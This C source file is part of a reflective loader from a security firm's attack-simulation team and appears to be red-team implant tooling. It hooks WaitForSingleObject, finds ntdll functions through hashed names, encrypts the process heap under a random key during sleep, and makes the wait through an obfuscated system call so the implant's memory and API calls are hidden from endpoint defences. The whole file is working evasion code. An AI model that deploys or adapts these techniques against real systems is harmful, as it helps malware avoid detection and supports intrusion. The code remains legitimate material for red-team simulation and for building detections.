/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlNtStatusToDosError );
	D_API( NtWaitForSingleObject );
	D_API( RtlSetLastWin32Error );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Awaits an object to be signaled before returning
 * a result.
 *
!*/
D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD Timeout )
{
	API		Api;
	LARGE_INTEGER	Del;

	BYTE		Key[ 16 ];

	PVOID*		Arg = NULL;
	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );

	/* Random key generation */
	RandomString( &Key, sizeof( Key ) );

	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Encrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );
	
	/* Allocate argument buffer */
	if ( ( Arg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 3 * sizeof( PVOID ) ) ) != NULL ) {
		if ( Timeout != INFINITE ) 
		{
			Del.QuadPart = Timeout * -10000LL;
			
			/* Execute NtWaitForSingleObject */
			Arg[0] = C_PTR( Handle );
			Arg[1] = C_PTR( FALSE );
			Arg[2] = C_PTR( &Del );
			Nst = ObfSystemCall( Api.NtWaitForSingleObject, Arg, ARRAYSIZE( Arg ) );
		} else {
			/* Execute NtWaitForSingleObject */
			Arg[0] = C_PTR( Handle );
			Arg[1] = C_PTR( FALSE );
			Arg[2] = C_PTR( NULL );
			Nst = ObfSystemCall( Api.NtWaitForSingleObject, Arg, ARRAYSIZE( Arg ) );
		};
		/* Free argument buffer */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Arg );
	} else
	{
		/* Notify about arg alloc failure */
		Nst = STATUS_INSUFFICIENT_RESOURCES;
	}
	/* Error return */
	if ( ! NT_SUCCESS( Nst ) ) {
		Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
		Nst = WAIT_FAILED;
	};

	/* Decrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	return Nst;
};
